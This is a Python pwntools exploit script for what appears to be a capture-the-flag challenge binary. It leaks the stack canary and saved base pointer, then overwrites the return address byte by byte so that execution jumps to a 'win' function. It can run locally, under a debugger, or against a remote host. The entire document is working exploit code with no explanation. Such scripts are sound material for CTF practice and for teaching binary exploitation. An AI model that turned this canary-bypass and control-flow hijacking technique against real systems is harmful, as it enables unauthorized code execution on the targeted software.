#!/usr/bin/env python3
from pwn import *

BIN_FILE  = './chal'
LIBC_FILE = ''

HOST = args.HOST or 'localhost'
PORT = int(args.PORT or 1337)

context(os='linux', arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'

binf = ELF(BIN_FILE)
libc = ELF(LIBC_FILE) if LIBC_FILE != '' else None

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug(BIN_FILE)
    else:
        return process(BIN_FILE)

def setbuf(io, n, c):
    io.sendlineafter(b'size > ', n)
    io.sendlineafter(b'char > ', c)

def attack(io):
    setbuf(io, '105', 'a')
    leak = io.recv(112)
    canary = b'\x00' + leak[105:]
    saved_rbp = io.recvline().strip() + b'\x00\x00'

    log.info(f'CANARY: {hex(u64(canary))}')
    log.info(f'SAVED RBP: {hex(u64(saved_rbp))}')

    for i in range(8):
        setbuf(io, str(128-i), p64(binf.sym['win'])[7-i:8-i])

    for i in range(8):
        setbuf(io, str(120-i), saved_rbp[7-i:8-i])

    for i in range(8):
        setbuf(io, str(112-i), canary[7-i:8-i])

    io.sendlineafter(b'size > ', '0')

def main():
    io = start()
    attack(io)
    io.interactive()

if __name__ == '__main__':
    main()
